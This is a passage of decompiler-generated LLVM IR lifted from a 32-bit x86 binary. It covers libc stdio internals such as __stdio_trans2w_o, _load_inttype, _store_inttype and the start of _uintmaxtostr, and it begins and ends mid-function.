  store i32 %v1_8051cc3, i32* %eax.global-to-local, align 4
  %v1_8051ccb = icmp eq i32 %v1_8051cc3, 0
  br i1 %v1_8051ccb, label %dec_label_pc_8051d2e, label %dec_label_pc_8051ccf

dec_label_pc_8051ccf:                             ; preds = %dec_label_pc_8051cbf
  %v0_8051ccf = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_8051ccf, %v1_8051cc3
  br i1 %tmp23, label %dec_label_pc_8051cd5, label %dec_label_pc_8051cd7

dec_label_pc_8051cd5:                             ; preds = %dec_label_pc_8051ccf
  br label %dec_label_pc_8051cd7

dec_label_pc_8051cd7:                             ; preds = %dec_label_pc_8051ccf, %dec_label_pc_8051cd5
  %storemerge24 = phi i32 [ %v1_8051cc3, %dec_label_pc_8051cd5 ], [ %v0_8051ccf, %dec_label_pc_8051ccf ]
  %v0_8051cde = phi i32 [ %v1_8051cc3, %dec_label_pc_8051cd5 ], [ %v0_8051ccf, %dec_label_pc_8051ccf ]
  store i32 %storemerge24, i32* %esi.global-to-local, align 4
  %v2_8051cd9 = sub i32 %v0_8051ccf, %v0_8051cde
  store i32 %v2_8051cd9, i32* %eax.global-to-local, align 4
  %v0_8051cdb = load i32, i32* @ebp, align 4
  %v2_8051cdb = add i32 %v0_8051cdb, %v2_8051cd9
  store i32 %v2_8051cdb, i32* %ebp.global-to-local, align 4
  %v4_8051ce2 = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v0_8051cde, i32 %v2_8051cd9)
  store i32 %v4_8051ce2, i32* %eax.global-to-local, align 4
  store i32 %v4_8051ce2, i32* @edx, align 4
  %v1_8051cec = icmp eq i32 %v4_8051ce2, 0
  br i1 %v1_8051cec, label %dec_label_pc_8051d2e, label %dec_label_pc_8051cf0

dec_label_pc_8051cf0:                             ; preds = %dec_label_pc_8051cd7
  %v0_8051cf0 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051cf0 = load i32, i32* %esi.global-to-local, align 4
  %v2_8051cf0 = sub i32 %v0_8051cf0, %v4_8051ce2
  %v2_8051cf4 = add i32 %v2_8051cf0, %v1_8051cf0
  store i32 %v2_8051cf4, i32* %eax.global-to-local, align 4
  %v0_8051cf6 = load i32, i32* @ebx, align 4
  %v1_8051cf6 = add i32 %v0_8051cf6, 16
  %v2_8051cf6 = inttoptr i32 %v1_8051cf6 to i32*
  %v3_8051cf6 = load i32, i32* %v2_8051cf6, align 4
  %v5_8051cf6 = sub i32 %v3_8051cf6, %v2_8051cf4
  store i32 %v5_8051cf6, i32* %v2_8051cf6, align 4
  %v0_8051cf9 = load i32, i32* @edi, align 4
  %v1_8051cf9 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051cf9 = sub i32 %v0_8051cf9, %v1_8051cf9
  store i32 %v2_8051cf9, i32* @edi, align 4
  br label %dec_label_pc_8051d2e

dec_label_pc_8051cfd:                             ; preds = %dec_label_pc_8051c8f
  %v2_8051cfd = add i32 %arg3, 8
  %v3_8051cfd = inttoptr i32 %v2_8051cfd to i32*
  %v4_8051cfd = load i32, i32* %v3_8051cfd, align 4
  %v15_8051cfd = icmp eq i32 %v3_8051c69, %v4_8051cfd
  br i1 %v15_8051cfd, label %dec_label_pc_8051d16, label %dec_label_pc_8051d02

dec_label_pc_8051d02:                             ; preds = %dec_label_pc_8051cfd
  %v1_8051d06 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_8051d06, i32* %eax.global-to-local, align 4
  %v1_8051d0e = icmp eq i32 %v1_8051d06, 0
  br i1 %v1_8051d0e, label %dec_label_pc_8051d02.dec_label_pc_8051d16_crit_edge, label %dec_label_pc_8051d12

dec_label_pc_8051d02.dec_label_pc_8051d16_crit_edge: ; preds = %dec_label_pc_8051d02
  %v0_8051d16.pre = load i32, i32* @edi, align 4
  %v0_8051d1e.pre = load i32, i32* @ebx, align 4
  %v2_8051d25.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8051d16

dec_label_pc_8051d12:                             ; preds = %dec_label_pc_8051d02
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8051d2e

dec_label_pc_8051d16:                             ; preds = %dec_label_pc_8051d02.dec_label_pc_8051d16_crit_edge, %dec_label_pc_8051cfd, %entry
  %v2_8051d25 = phi i32 [ %v2_8051d25.pre, %dec_label_pc_8051d02.dec_label_pc_8051d16_crit_edge ], [ %v0_8051c4b, %dec_label_pc_8051cfd ], [ %v0_8051c4b, %entry ]
  %v0_8051d1e = phi i32 [ %v0_8051d1e.pre, %dec_label_pc_8051d02.dec_label_pc_8051d16_crit_edge ], [ %arg3, %dec_label_pc_8051cfd ], [ %arg3, %entry ]
  %v0_8051d16 = phi i32 [ %v0_8051d16.pre, %dec_label_pc_8051d02.dec_label_pc_8051d16_crit_edge ], [ %arg2, %dec_label_pc_8051cfd ], [ %arg2, %entry ]
  store i32 %v2_8051d25, i32* @ebx, align 4
  store i32 %v0_8051c49, i32* @edi, align 4
  %v4_8051d29 = inttoptr i32 %v0_8051d1e to i16*
  %v5_8051d29 = call i32 @__stdio_WRITE(i16* %v4_8051d29, i32 %v0_8051d16, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8051d29, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d2e

dec_label_pc_8051d2e:                             ; preds = %dec_label_pc_8051cd7, %dec_label_pc_8051cbf, %dec_label_pc_8051cae, %dec_label_pc_8051c95, %dec_label_pc_8051d12, %dec_label_pc_8051cf0, %dec_label_pc_8051c7b, %dec_label_pc_8051d16
  %v0_8051d31 = load i32, i32* @edi, align 4
  store i32 %v0_8051d31, i32* %eax.global-to-local, align 4
  %v2_8051d33 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051d33, i32* @ebx, align 4
  store i32 %v0_8051c4a, i32* @esi, align 4
  store i32 %v0_8051c49, i32* @edi, align 4
  store i32 %v0_8051c48, i32* @ebp, align 4
  ret i32 %v0_8051d31

; uselistorder directives
  uselistorder i32 %v2_8051cf4, { 1, 0 }
  uselistorder i32 %v4_8051ce2, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8051cd9, { 1, 0, 2 }
  uselistorder i32 %v0_8051ccf, { 3, 0, 1, 2 }
  uselistorder i32 %v2_8051c8f, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 %v0_8051c49, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 4, 5, 6, 3, 0, 1, 2, 7 }
  uselistorder label %dec_label_pc_8051d2e, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_8051cd7, { 1, 0 }
  uselistorder label %dec_label_pc_8051c7b, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8051d38 = load i32, i32* @ebx, align 4
  %v4_8051d3c = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051d3c, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_8051d44 = bitcast i16* %arg1 to i32*
  %v2_8051d44 = load i32, i32* %v1_8051d44, align 4
  store i32 %v2_8051d44, i32* %eax.global-to-local, align 4
  %v1_8051d46 = urem i32 %v2_8051d44, 65536
  store i32 %v1_8051d46, i32* %edx.global-to-local, align 4
  %v2_8051d49 = and i32 %v1_8051d46, %arg2
  %v3_8051d49 = icmp eq i32 %v2_8051d49, 0
  %v1_8051d4b = icmp eq i1 %v3_8051d49, false
  br i1 %v1_8051d4b, label %dec_label_pc_8051d5a, label %dec_label_pc_8051d4d

dec_label_pc_8051d4d:                             ; preds = %entry
  %v1_8051d4d = and i32 %v2_8051d44, 2176
  %v2_8051d4d = icmp eq i32 %v1_8051d4d, 0
  store i32 %v1_8051d4d, i32* %edx.global-to-local, align 4
  %v1_8051d53 = icmp eq i1 %v2_8051d4d, false
  br i1 %v1_8051d53, label %dec_label_pc_8051d62, label %dec_label_pc_8051d55

dec_label_pc_8051d55:                             ; preds = %dec_label_pc_8051d4d
  %v2_8051d55 = or i32 %v2_8051d44, %arg2
  store i32 %v2_8051d55, i32* %eax.global-to-local, align 4
  %v1_8051d57 = trunc i32 %v2_8051d55 to i16
  store i16 %v1_8051d57, i16* %arg1, align 2
  %v0_8051d5a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051d5a

dec_label_pc_8051d5a:                             ; preds = %entry, %dec_label_pc_8051d55
  %v0_8051d9f = phi i32 [ %v4_8051d3c, %entry ], [ %v0_8051d5a.pre, %dec_label_pc_8051d55 ]
  %v1_8051d5a = inttoptr i32 %v0_8051d9f to i16*
  %v2_8051d5a = load i16, i16* %v1_8051d5a, align 2
  %v3_8051d5a = zext i16 %v2_8051d5a to i32
  store i32 %v3_8051d5a, i32* %edx.global-to-local, align 4
  %v2_8051d5d = and i16 %v2_8051d5a, 32
  %v3_8051d5d = icmp eq i16 %v2_8051d5d, 0
  br i1 %v3_8051d5d, label %dec_label_pc_8051d76, label %dec_label_pc_8051d62

dec_label_pc_8051d62:                             ; preds = %dec_label_pc_8051d5a, %dec_label_pc_8051d4d
  %v1_8051d62 = call i32 @__errno_location(i32 %v0_8051d38)
  store i32 %v1_8051d62, i32* %eax.global-to-local, align 4
  %v1_8051d67 = inttoptr i32 %v1_8051d62 to i32*
  store i32 9, i32* %v1_8051d67, align 4
  br label %dec_label_pc_8051d6d

dec_label_pc_8051d6d:                             ; preds = %dec_label_pc_8051d8d, %dec_label_pc_8051d62
  %v0_8051d6d = load i32, i32* @ebx, align 4
  %v1_8051d6d = inttoptr i32 %v0_8051d6d to i16*
  %v2_8051d6d = load i16, i16* %v1_8051d6d, align 2
  %v3_8051d6d = or i16 %v2_8051d6d, 8
  store i16 %v3_8051d6d, i16* %v1_8051d6d, align 2
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051dd0

dec_label_pc_8051d76:                             ; preds = %dec_label_pc_8051d5a
  %v2_8051d76 = urem i16 %v2_8051d5a, 4
  %v3_8051d76 = icmp eq i16 %v2_8051d76, 0
  br i1 %v3_8051d76, label %dec_label_pc_8051dbc, label %dec_label_pc_8051d7b

dec_label_pc_8051d7b:                             ; preds = %dec_label_pc_8051d76
  %v2_8051d7b = and i32 %v3_8051d5a, 4
  %v3_8051d7b = icmp eq i32 %v2_8051d7b, 0
  %v1_8051d7e = icmp eq i1 %v3_8051d7b, false
  br i1 %v1_8051d7e, label %dec_label_pc_8051dac, label %dec_label_pc_8051d80

dec_label_pc_8051d80:                             ; preds = %dec_label_pc_8051d7b
  %v1_8051d80 = add i32 %v0_8051d9f, 20
  %v2_8051d80 = inttoptr i32 %v1_8051d80 to i32*
  %v3_8051d80 = load i32, i32* %v2_8051d80, align 4
  store i32 %v3_8051d80, i32* %eax.global-to-local, align 4
  %v2_8051d83 = add i32 %v0_8051d9f, 16
  %v3_8051d83 = inttoptr i32 %v2_8051d83 to i32*
  %v4_8051d83 = load i32, i32* %v3_8051d83, align 4
  %v15_8051d83 = icmp eq i32 %v3_8051d80, %v4_8051d83
  %v1_8051d86 = icmp eq i1 %v15_8051d83, false
  br i1 %v1_8051d86, label %dec_label_pc_8051d8d, label %dec_label_pc_8051d88

dec_label_pc_8051d88:                             ; preds = %dec_label_pc_8051d80
  %v2_8051d88 = and i32 %v3_8051d5a, 2
  %v3_8051d88 = icmp eq i32 %v2_8051d88, 0
  br i1 %v3_8051d88, label %dec_label_pc_8051dac, label %dec_label_pc_8051d8d

dec_label_pc_8051d8d:                             ; preds = %dec_label_pc_8051d88, %dec_label_pc_8051d80
  %v1_8051d8d = and i32 %v3_8051d5a, 1024
  store i32 %v1_8051d8d, i32* %edx.global-to-local, align 4
  %tmp17 = udiv i32 %v1_8051d8d, 1024
  %tmp18 = xor i32 %tmp17, 3
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v5_8051da0 = call i32 @__GI_fseek(i32 %v0_8051d9f, i32 0, i32 %tmp18, i32 %v1_8051d8d)
  store i32 %v5_8051da0, i32* %eax.global-to-local, align 4
  %v1_8051da8 = icmp eq i32 %v5_8051da0, 0
  %v1_8051daa = icmp eq i1 %v1_8051da8, false
  br i1 %v1_8051daa, label %dec_label_pc_8051d6d, label %dec_label_pc_8051d8d.dec_label_pc_8051dac_crit_edge

dec_label_pc_8051d8d.dec_label_pc_8051dac_crit_edge: ; preds = %dec_label_pc_8051d8d
  %v0_8051dac.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051dac

dec_label_pc_8051dac:                             ; preds = %dec_label_pc_8051d8d.dec_label_pc_8051dac_crit_edge, %dec_label_pc_8051d88, %dec_label_pc_8051d7b
  %v10_8051dac = phi i32 [ %v0_8051dac.pre, %dec_label_pc_8051d8d.dec_label_pc_8051dac_crit_edge ], [ %v0_8051d9f, %dec_label_pc_8051d88 ], [ %v0_8051d9f, %dec_label_pc_8051d7b ]
  %v1_8051dac = inttoptr i32 %v10_8051dac to i16*
  %v2_8051dac = load i16, i16* %v1_8051dac, align 2
  %v3_8051dac = and i16 %v2_8051dac, -4
  store i16 %v3_8051dac, i16* %v1_8051dac, align 2
  %v0_8051db0 = load i32, i32* @ebx, align 4
  %v1_8051db0 = add i32 %v0_8051db0, 8
  %v2_8051db0 = inttoptr i32 %v1_8051db0 to i32*
  %v3_8051db0 = load i32, i32* %v2_8051db0, align 4
  store i32 %v3_8051db0, i32* %eax.global-to-local, align 4
  %v2_8051db3 = add i32 %v0_8051db0, 24
  %v3_8051db3 = inttoptr i32 %v2_8051db3 to i32*
  store i32 %v3_8051db0, i32* %v3_8051db3, align 4
  %v0_8051db6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051db6 = load i32, i32* @ebx, align 4
  %v2_8051db6 = add i32 %v1_8051db6, 16
  %v3_8051db6 = inttoptr i32 %v2_8051db6 to i32*
  store i32 %v0_8051db6, i32* %v3_8051db6, align 4
  %v0_8051db9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051db9 = load i32, i32* @ebx, align 4
  %v2_8051db9 = add i32 %v1_8051db9, 20
  %v3_8051db9 = inttoptr i32 %v2_8051db9 to i32*
  store i32 %v0_8051db9, i32* %v3_8051db9, align 4
  %v0_8051dbc.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051dbc

dec_label_pc_8051dbc:                             ; preds = %dec_label_pc_8051d76, %dec_label_pc_8051dac
  %v9_8051dbc = phi i32 [ %v0_8051d9f, %dec_label_pc_8051d76 ], [ %v0_8051dbc.pre, %dec_label_pc_8051dac ]
  %v1_8051dbc = inttoptr i32 %v9_8051dbc to i16*
  %v2_8051dbc = load i16, i16* %v1_8051dbc, align 2
  %v3_8051dbc = or i16 %v2_8051dbc, 64
  store i16 %v3_8051dbc, i16* %v1_8051dbc, align 2
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8051dc2 = load i32, i32* @ebx, align 4
  %v1_8051dc2 = inttoptr i32 %v0_8051dc2 to i16*
  %v2_8051dc2 = load i16, i16* %v1_8051dc2, align 2
  %v3_8051dc2 = zext i16 %v2_8051dc2 to i32
  store i32 %v3_8051dc2, i32* %eax.global-to-local, align 4
  %v3_8051dc5 = and i16 %v2_8051dc2, 2816
  %v4_8051dc5 = icmp eq i16 %v3_8051dc5, 0
  %v1_8051dc8 = icmp eq i1 %v4_8051dc5, false
  br i1 %v1_8051dc8, label %dec_label_pc_8051dd0, label %dec_label_pc_8051dca

dec_label_pc_8051dca:                             ; preds = %dec_label_pc_8051dbc
  %v1_8051dca = add i32 %v0_8051dc2, 12
  %v2_8051dca = inttoptr i32 %v1_8051dca to i32*
  %v3_8051dca = load i32, i32* %v2_8051dca, align 4
  store i32 %v3_8051dca, i32* %eax.global-to-local, align 4
  %v2_8051dcd = add i32 %v0_8051dc2, 28
  %v3_8051dcd = inttoptr i32 %v2_8051dcd to i32*
  store i32 %v3_8051dca, i32* %v3_8051dcd, align 4
  %v0_8051dd0.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051dd0

dec_label_pc_8051dd0:                             ; preds = %dec_label_pc_8051dbc, %dec_label_pc_8051d6d, %dec_label_pc_8051dca
  %v0_8051dd0 = phi i32 [ 0, %dec_label_pc_8051dbc ], [ -1, %dec_label_pc_8051d6d ], [ %v0_8051dd0.pre, %dec_label_pc_8051dca ]
  store i32 %v0_8051dd0, i32* %eax.global-to-local, align 4
  %v2_8051dd2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051dd2, i32* %edx.global-to-local, align 4
  store i32 %v0_8051d38, i32* @ebx, align 4
  ret i32 %v0_8051dd0

; uselistorder directives
  uselistorder i32 %v0_8051dd0, { 1, 0 }
  uselistorder i32 %v0_8051dc2, { 1, 0, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32 %v1_8051d8d, { 1, 0, 2 }
  uselistorder i32 %v0_8051d9f, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_8051d46, { 1, 0 }
  uselistorder i32 %v2_8051d44, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8051d38, { 1, 0 }
  uselistorder i32 1024, { 0, 17, 3, 10, 8, 18, 4, 1, 2, 15, 5, 14, 6, 16, 9, 11, 12, 13, 7 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051dd0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051dbc, { 1, 0 }
  uselistorder label %dec_label_pc_8051d5a, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_8051de0 = icmp slt i32 %tmp, 0
  %v3_8051e09 = and i32 %tmp5, 2048
  %v4_8051e09 = icmp eq i32 %v3_8051e09, 0
  br i1 %v5_8051de0, label %dec_label_pc_8051e09, label %dec_label_pc_8051de7

dec_label_pc_8051de7:                             ; preds = %entry
  %v1_8051dea = icmp eq i1 %v4_8051e09, false
  br i1 %v1_8051dea, label %dec_label_pc_8051e0e, label %dec_label_pc_8051dec

dec_label_pc_8051dec:                             ; preds = %dec_label_pc_8051de7
  %v1_8051dec = inttoptr i32 %tmp4 to i32*
  %v2_8051dec = load i32, i32* %v1_8051dec, align 4
  %v6_8051dee = icmp eq i32 %tmp5, 256
  %v1_8051df4 = icmp eq i1 %v6_8051dee, false
  br i1 %v1_8051df4, label %dec_label_pc_8051dfb, label %dec_label_pc_8051df6

dec_label_pc_8051df6:                             ; preds = %dec_label_pc_8051dec
  %v1_8051df6 = urem i32 %v2_8051dec, 256
  br label %dec_label_pc_8051e06

dec_label_pc_8051dfb:                             ; preds = %dec_label_pc_8051dec
  %v6_8051dfb = icmp eq i32 %tmp5, 512
  %v1_8051e01 = icmp eq i1 %v6_8051dfb, false
  br i1 %v1_8051e01, label %dec_label_pc_8051e06, label %dec_label_pc_8051e03

dec_label_pc_8051e03:                             ; preds = %dec_label_pc_8051dfb
  %v1_8051e03 = urem i32 %v2_8051dec, 65536
  br label %dec_label_pc_8051e06

dec_label_pc_8051e06:                             ; preds = %dec_label_pc_8051dfb, %dec_label_pc_8051df6, %dec_label_pc_8051e03
  %v0_8051e08 = phi i32 [ %v2_8051dec, %dec_label_pc_8051dfb ], [ %v1_8051df6, %dec_label_pc_8051df6 ], [ %v1_8051e03, %dec_label_pc_8051e03 ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8051e08

dec_label_pc_8051e09:                             ; preds = %entry
  br i1 %v4_8051e09, label %dec_label_pc_8051e14, label %dec_label_pc_8051e0e

dec_label_pc_8051e0e:                             ; preds = %dec_label_pc_8051e09, %dec_label_pc_8051de7
  %v1_8051e0e = add i32 %tmp4, 4
  %v2_8051e0e = inttoptr i32 %v1_8051e0e to i32*
  %v3_8051e0e = load i32, i32* %v2_8051e0e, align 4
  store i32 %v3_8051e0e, i32* @edx, align 4
  %v1_8051e11 = inttoptr i32 %tmp4 to i32*
  %v2_8051e11 = load i32, i32* %v1_8051e11, align 4
  ret i32 %v2_8051e11

dec_label_pc_8051e14:                             ; preds = %dec_label_pc_8051e09
  %v1_8051e14 = inttoptr i32 %tmp4 to i32*
  %v2_8051e14 = load i32, i32* %v1_8051e14, align 4
  %v6_8051e16 = icmp eq i32 %tmp5, 256
  %v1_8051e1c = icmp eq i1 %v6_8051e16, false
  br i1 %v1_8051e1c, label %dec_label_pc_8051e23, label %dec_label_pc_8051e1e

dec_label_pc_8051e1e:                             ; preds = %dec_label_pc_8051e14
  %v1_8051e1e = mul i32 %v2_8051e14, 16777216
  %v2_8051e1e = sdiv i32 %v1_8051e1e, 16777216
  br label %dec_label_pc_8051e2c

dec_label_pc_8051e23:                             ; preds = %dec_label_pc_8051e14
  %v6_8051e23 = icmp eq i32 %tmp5, 512
  %v1_8051e29 = icmp eq i1 %v6_8051e23, false
  br i1 %v1_8051e29, label %dec_label_pc_8051e2c, label %dec_label_pc_8051e2b

dec_label_pc_8051e2b:                             ; preds = %dec_label_pc_8051e23
  %v1_8051e2b = mul i32 %v2_8051e14, 65536
  %v2_8051e2b = sdiv i32 %v1_8051e2b, 65536
  br label %dec_label_pc_8051e2c

dec_label_pc_8051e2c:                             ; preds = %dec_label_pc_8051e23, %dec_label_pc_8051e1e, %dec_label_pc_8051e2b
  %v0_8051e2c = phi i32 [ %v2_8051e14, %dec_label_pc_8051e23 ], [ %v2_8051e1e, %dec_label_pc_8051e1e ], [ %v2_8051e2b, %dec_label_pc_8051e2b ]
  %v1_8051e2c = ashr i32 %v0_8051e2c, 31
  store i32 %v1_8051e2c, i32* @edx, align 4
  ret i32 %v0_8051e2c

; uselistorder directives
  uselistorder i32 %v0_8051e2c, { 1, 0 }
  uselistorder i32 %v2_8051e14, { 2, 0, 1 }
  uselistorder i32 %v2_8051dec, { 2, 0, 1 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8051e2c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051e06, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_6()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051e30 = load i32, i32* @ebx, align 4
  store i32 %v0_8051e30, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8051e35 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_8051e35, i32* %ebx.global-to-local, align 4
  %v4_8051e39 = trunc i32 %tmp4 to i16
  %v6_8051e41 = icmp eq i32 %tmp6, 256
  %v1_8051e47 = icmp eq i1 %v6_8051e41, false
  br i1 %v1_8051e47, label %dec_label_pc_8051e4d, label %dec_label_pc_8051e49

dec_label_pc_8051e49:                             ; preds = %entry
  %v2_8051e49 = trunc i32 %tmp4 to i8
  %v4_8051e49 = bitcast i16* %tmp5 to i8*
  store i8 %v2_8051e49, i8* %v4_8051e49, align 1
  br label %dec_label_pc_8051e6b

dec_label_pc_8051e4d:                             ; preds = %entry
  %v6_8051e4d = icmp eq i32 %tmp6, 2048
  %v1_8051e53 = icmp eq i1 %v6_8051e4d, false
  br i1 %v1_8051e53, label %dec_label_pc_8051e5c, label %dec_label_pc_8051e55

dec_label_pc_8051e55:                             ; preds = %dec_label_pc_8051e4d
  %sext2 = mul i32 %tmp4, 65536
  %v1_8051e55 = sdiv i32 %sext2, 65536
  %v3_8051e55 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8051e55, i32* %v3_8051e55, align 4
  %v0_8051e57 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051e57 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051e57 = add i32 %v1_8051e57, 4
  %v3_8051e57 = inttoptr i32 %v2_8051e57 to i32*
  store i32 %v0_8051e57, i32* %v3_8051e57, align 4
  br label %dec_label_pc_8051e6b

dec_label_pc_8051e5c:                             ; preds = %dec_label_pc_8051e4d
  %v6_8051e5c = icmp eq i32 %tmp6, 512
  %v1_8051e62 = icmp eq i1 %v6_8051e5c, false
  br i1 %v1_8051e62, label %dec_label_pc_8051e69, label %dec_label_pc_8051e64

dec_label_pc_8051e64:                             ; preds = %dec_label_pc_8051e5c
  store i16 %v4_8051e39, i16* %tmp5, align 2
  br label %dec_label_pc_8051e6b

dec_label_pc_8051e69:                             ; preds = %dec_label_pc_8051e5c
  %sext3 = mul i32 %tmp4, 65536
  %v1_8051e69 = sdiv i32 %sext3, 65536
  %v3_8051e69 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8051e69, i32* %v3_8051e69, align 4
  br label %dec_label_pc_8051e6b

dec_label_pc_8051e6b:                             ; preds = %dec_label_pc_8051e64, %dec_label_pc_8051e55, %dec_label_pc_8051e49, %dec_label_pc_8051e69
  %v2_8051e6b = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051e6b, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_8051e6c = sdiv i32 %sext, 65536
  ret i32 %v1_8051e6c

; uselistorder directives
  uselistorder label %dec_label_pc_8051e6b, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_8051e7b = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051e7b, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_8051e87 = icmp slt i32 %arg4, 0
  %v1_8051e89 = icmp eq i1 %v2_8051e87, false
  br i1 %v1_8051e89, label %dec_label_pc_8051eaa, label %dec_label_pc_8051e8b

dec_label_pc_8051e8b:                             ; preds = %entry
  %v1_8051e8b = sub i32 0, %arg4
  store i32 %v1_8051e8b, i32* %esi.global-to-local, align 4
  %v2_8051e8d = icmp slt i32 %arg3, 0
  %v1_8051e8f = icmp eq i1 %v2_8051e8d, false
  br i1 %v1_8051e8f, label %dec_label_pc_8051eaa, label %dec_label_pc_8051e91

dec_label_pc_8051e91:                             ; preds = %dec_label_pc_8051e8b
  %v1_8051e91 = sub i32 0, %arg2
  %v5_8051e91 = icmp ne i32 %arg2, 0
  store i32 %v1_8051e91, i32* %ecx.global-to-local, align 4
  %v2_8051e93 = zext i1 %v5_8051e91 to i32
  %v3_8051e93 = add i32 %v2_8051e93, %arg3
  %v1_8051e9e = sub i32 0, %v3_8051e93
  store i32 %v1_8051e9e, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051eaa

dec_label_pc_8051eaa:                             ; preds = %entry, %dec_label_pc_8051e8b, %dec_label_pc_8051e91
  %v0_8051eaf = phi i32 [ %v1_8051e8b, %dec_label_pc_8051e91 ], [ %v1_8051e8b, %dec_label_pc_8051e8b ], [ %arg4, %entry ]
  %stack_var_-28.0 = phi i32 [ 1, %dec_label_pc_8051e91 ], [ 0, %dec_label_pc_8051e8b ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_8051eaf
  %tmp35 = urem i32 -1, %v0_8051eaf
  %v1_8051eb1 = add i32 %tmp35, 1
  store i8 0, i8* %arg1, align 1
  %v1_8051eb5 = load i32, i32* %esi.global-to-local, align 4
  %v12_8051eb5 = icmp eq i32 %v1_8051eb1, %v1_8051eb5
  %v1_8051ebf = icmp eq i1 %v12_8051eb5, false
  br i1 %v1_8051ebf, label %dec_label_pc_8051ece, label %dec_label_pc_8051ec1

dec_label_pc_8051ec1:                             ; preds = %dec_label_pc_8051eaa
  %v1_8051ec1 = add i32 %div, 1
  br label %dec_label_pc_8051ece

dec_label_pc_8051ece:                             ; preds = %dec_label_pc_8051eaa, %dec_label_pc_8051ec1
  %stack_var_-20.0.off0 = phi i32 [ %v1_8051eb1, %dec_label_pc_8051eaa ], [ 0, %dec_label_pc_8051ec1 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_8051eaa ], [ %v1_8051ec1, %dec_label_pc_8051ec1 ]
  %v0_8051ece = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8051ece, i32* %ebp.global-to-local, align 4
  %v0_8051ed0 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8051ed0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051ed6

dec_label_pc_8051ed6:                             ; preds = %dec_label_pc_8051f15, %dec_label_pc_8051ece
  %v0_8051f0d = phi i32 [ %v0_8051f26, %dec_label_pc_8051f15 ], [ %v0_8051ece, %dec_label_pc_8051ece ]
  %v0_8051eda = phi i32 [ %v1_8051f28, %dec_label_pc_8051f15 ], [ %v0_8051ed0, %dec_label_pc_8051ece ]
